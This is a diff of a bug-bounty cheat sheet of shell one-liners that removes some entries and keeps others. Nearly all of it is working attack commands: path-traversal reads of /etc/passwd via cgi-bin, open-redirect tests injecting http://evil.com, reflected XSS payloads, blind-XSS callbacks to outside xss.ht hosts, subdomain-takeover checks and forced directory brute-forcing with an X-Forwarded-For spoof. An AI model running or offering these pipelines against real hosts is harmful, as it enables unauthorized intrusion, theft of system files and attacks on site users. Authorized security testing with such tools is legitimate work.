@@ -62,9 +62,6 @@ ffuf -u https://FUZZ.target.com -w dns.txt -v | grep "| URL |" | awk '{print $4}
 ```
 cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
 ```
-```
-subjack -w subs -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
-```
 -------------------------------
 ## LFI:
 ```
@@ -76,16 +73,10 @@ waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -
 ```
 cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
 ```
-```
-gau http://target.com | gf lfi | qsreplace "/etc/passwd" | httpx -t 250 -mr "root:x" 
-```
 ----------------------
 ## Open Redirect:
 ```
 waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
-```
-```
-export LHOST="URL"; waybackurls $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
 ```
 cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
@@ -119,13 +110,7 @@ waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | whi
 cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
 ```
 ```
-echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (freq or Airixss)
-```
-```
 cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
-```
-```
-waybackurls target.com | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b hacker.xss.ht pipe > output.txt
 ```
 ```
 cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
@@ -134,9 +119,6 @@ cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http:/
 ## Hidden Dirs:
 ```
 dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
-```
-```
-cat targets.txt | xargs -I@ sh -c 'ffuf -w wordlists.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -H "X-Forwarded-For:127.0.0.1"'
 ```
 ```
 ffuf -c -w urls.txt:FUZZ1 -w wordlist.txt:FUZZ2 -u FUZZ1/FUZZ2 -mc 200 -ac -v -of html -o output
